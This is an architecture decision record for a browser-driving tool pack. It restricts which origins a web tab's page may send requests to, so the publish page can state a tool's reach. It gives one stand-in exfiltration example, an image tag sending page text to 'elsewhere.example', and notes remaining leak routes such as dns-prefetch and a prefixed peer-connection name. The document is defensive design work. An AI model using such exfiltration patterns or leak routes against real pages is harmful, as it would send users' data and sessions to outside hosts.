# 0292. A web tab sends only to its surface and the destinations its tool declares, and the publish page says so

**Status:** Accepted. Design decision. The owner had not read this record when it was merged.

**Date:** 2026-11-18

**Changes:** the tab of the browser base (`crates/a2m-pack-web-browser/src/tab.rs`, `origin.rs`), the tab setup, refusals, codes, and lowerings of `a2m-pack-web-ui`, the test application's `/escapes/loads`, the designs of both crates, [section 301](../spec/3-packs/301-the-web-pack.md), [section 403](../spec/4-building-tools/403-testing-and-publish-gates.md), [section 704](../spec/7-project/704-readiness.md), and `SCOPE.md`. **Carries out** what [decision 0264](0264-the-publish-page-renders-the-typed-review-sign-ins-first-from-one-keeper-call.md) left to the browser base ("The web pack, checked"). No kernel crate, driver interface, provider manifest field, or file format changes.

## Context

The publish page shows, for each tool, every address it can send a request to ([decision 0252](0252-a-fixed-place-a-review-that-shows-what-runs-and-a-sign-in-before-its-probe.md)). The web pack said it did not state it, and was right: `Page::judge_request` refused a request only where the tab observes and the method may write. An image, a script, a style, or a `fetch` with `GET`, `HEAD`, or `OPTIONS` went to any origin, and a tab that may act held only its own document. So a person approving a web tool was not told where the page it drives can send what it shows, and a record holding `<img src="https://elsewhere.example/?q=...">` could send the page's text to anyone, in every run, with the person's session. [Section 502](../spec/5-security/502-defending-against-a-manipulated-agent.md) assumes the agent, and so what it feeds the system, may be steered.

## Alternatives

| | What a person building over a real web application pays | What the person approving is told | Rules served |
| --- | --- | --- | --- |
| **(a) A declared list, everything else refused in the browser as a named stop** | A page that loads a font, a script, or an image from another origin stops the run with `origin_not_declared`, naming the origin, until the tool declares it. A refused script can break the page; that is a named stop, never a guess | Exactly where the tool's page can send: its surface and the declared destinations, as for an HTTP tool | Rule 2 (safe first, and true), rule 5 (the page reaches what is declared, openly), rule 7, the steered-agent convention |
| **(b) Allow as today, record the origins seen in discovery and tests, state them as observed** | Nothing: every page works as before | A list of what was seen once, under a "may reach others" the page cannot drop; a run can still reach an origin nobody saw, so "only" would be false | Easy alone. Fails rule 2's order and rule 7: an unseen origin is reached, not stopped |
| **(c) Refuse everything outside the surface's own origin, with no list** | Every page that loads anything from another origin is broken for good, with no way to declare it: most real applications | The truth, for the few tools that still work | Safe, and fails the North Star ([decision 0277](0277-the-north-star-an-agent-uses-the-software-a-person-already-has.md)): it brings little software within reach |

**Chosen: (a).** It is the only one that is both safe and true, and it leaves the person a step to take rather than a wall. (b) is kept in a narrower form: what a tab refuses is reported by origin, so discovery can draft the list (below).

**Where the list is declared.** Two places were weighed. A field of the web surface, one list for every tool over it, is shorter to write, but its addresses would be outside the run's `Destinations`, which the driver contract says no driver reaches beyond ([section 203](../spec/2-kernel/203-the-provider-contract.md)), and it would be one list for every environment while a surface's address is per environment. The operation's `permissions.destinations` is already the run's declared reach beyond its surfaces, already in `Destinations`, and already folded into the tool's reach on the publish page; it needs no kernel, contract, or file-format change. It is repeated for each tool over the surface, which drafting fills in. **Chosen: the operation's `permissions.destinations`.** A web tool's destination is written as an origin, with its scheme: `https://assets.example.com`, or with a port. One without a scheme names no origin a browser can compare with, and gives the tab nothing (rule 7): it can only close the tab's reach.

## Decision

1. **A tab has two sets of origins.** `Origins` holds the origins the tab may be on, as before: its own document, `goto`, `fetch`, and the helper's check of every locate, read, and act are held to them. It gains a second set, the origins the tab's page may send requests to and the tab is never on (`Origins::and_requests_to`). The `ui` and `page_http` drivers open each tab on the surface's own origin, and let its requests go also to each destination of the run that is not the address of a surface of the target and reads as an origin. Another surface's address is not added: its screens are not this run's.
2. **Every request outside them is refused in the browser, in both postures.** `judge_request` fails, before it leaves the browser, every request of the page, its frames, and its workers whose address is on neither set, whatever its method, and reports it as `OUTSIDE` with its address cut at the query. An acting tab now holds every request, as an observing tab does, not only its documents; it attaches every frame in another process and every worker waiting, and lets it run only once it holds its own requests too (one that cannot is reported as `WORKER` and not let run, as in an observing tab). What interception does not see is refused by a script in the page, as in an observing tab: in an acting tab, a WebSocket or a WebTransport to an origin outside both sets, every peer connection, every shared worker, and every service worker the page registers. In an observing tab every socket is refused, as before. A service worker is held to the observing tab's script in either posture: it outlives the page that woke it and serves every page of its origin. So a page of an acting tab can no longer start a shared worker or register a service worker, which it could before.
3. **A refusal is a named stop.** The drivers turn `OUTSIDE` into `policy`, `origin_not_declared`, a new row of the web pack's table, naming the origin and saying to declare it in the operation's `permissions.destinations` if the system's pages really load from it. The run stops at the step's check of what the tab refused, also when the page might have worked without what was refused: the driver cannot know that (rule 7).
4. **The pack states where its tools send.** `UiLowering::statement` and `PageHttpLowering::statement` answer `Statement::Stated` with `Sends::Only { surface: true, addresses: [] }`; the review adds the operation's declared destinations, as for every pack, so the tool's reach is `Reach::Stated`. They state that the binding starts no program and sets no variable: the browser is the engine's own, held to the digests the person reviewed, and the scripts a page brings run inside it and come only from the reach stated.
5. **What a request's body does.** The browser hands the engine each request it holds; for an acting tab that now includes every request its page's script makes, with its body (measured: the body of a write from inside the page is in the pause of its request, `Fetch.requestPaused`; the protocol gives no bound for it). So a write's body crosses into the engine's process in that event, as the cookies and the headers already do in the network events; none of it is read into a field or kept, and the test that names every carrier now names this one. This narrows what [decision 0254](0254-a-person-signs-in-in-a-window-of-the-engines-own-browser-and-the-web-pack-stops-on-every-declared-sign-of-expiry.md) said of an acting tab ("no body of a request its page's script makes" crosses), for the sake of holding where it is sent.

## Not done (package P3b)

- **Drafting the list.** The web pack's discoverer reports what its observing tab refused as a count by word; it is to carry each refused origin in the screen finding, and the drafting rules to add it to the drafted operation's `permissions.destinations`, so that a person reviews a list rather than writes one. That is in `a2m-pack-web-probe` and `a2m-pack-web-ui`.
- **Origins refused without a stop.** A page that loads an analytics script from another origin works without it. A person may want that origin refused and the run to go on, rather than allowed. A declared list of origins refused quietly is designed nowhere yet.
- **The sign-in tab.** A tab a person signs in in, in a window, holds only its documents, and hears no network event on purpose (decision 0254): its page's other requests still go anywhere, and its page can still register a service worker. It is not a tool's tab, so the publish page's reach is true without it: a worker it registers is locked whenever a tool's tab attaches it (measured). The sign-in's own addresses are the session keeper's.
- **A name looked up and a connection opened without a request.** A page can still make the browser look up a host name and open a connection to it, by `dns-prefetch` or `preconnect`; no request is sent, but the name itself leaves the machine. Not held, and not stated.
- **The cost.** Every request of an acting tab now waits for one answer of the engine over the pipe before it is sent. Not measured.

## Consequences

- A web tool's tools state, on the page a person publishes from, that they send only to their surface and their declared destinations, and the reach is no longer "not stated".
- A page that loads from an origin its tool does not declare stops the run with `origin_not_declared` in both postures, where before it worked. Discovery's observing tabs refuse such requests too, and report them as `OUTSIDE`.
- `Origins` gains `and_requests_to`; `ActTab::blocked` and `ObserveTab::blocked` report `OUTSIDE`. No other interface of either crate changes.

## Added since

Added 2026-11-18, from the validation of the tree this record's work is in.

- **A fault found beside it, and fixed.** The script an observing tab and every service worker carry refused a peer connection under its standard name and not under the older prefixed name the browser still answers to. An observed page could open a peer connection to any server. Both names are refused now, and a test asks for each in both kinds of tab. The fault was there before this record.
- **The sign-in tab changed too, and point by point this record did not say so.** A frame's document inside a sign-in tab is now judged like any request, and one outside the application and the sign-in providers is refused. The person at the window is shown no named stop for it. Showing the refusal in the window is owed with the rest of the sign-in tab's work.
- **Covered by reasoning and not by a test:** a subresource redirected to another origin, a beacon to another origin, a form posted into a frame, dedicated workers, WebTransport, an event source, a prefetch link, and the page's icon. **Not covered:** speculation rules, and a service worker woken with no tab attached.
- **A paused request has no bound of its own.** Each is continued or failed by a call with a deadline; if that call is lost the request stays paused until its tab closes, which for a refused request means it is never sent.
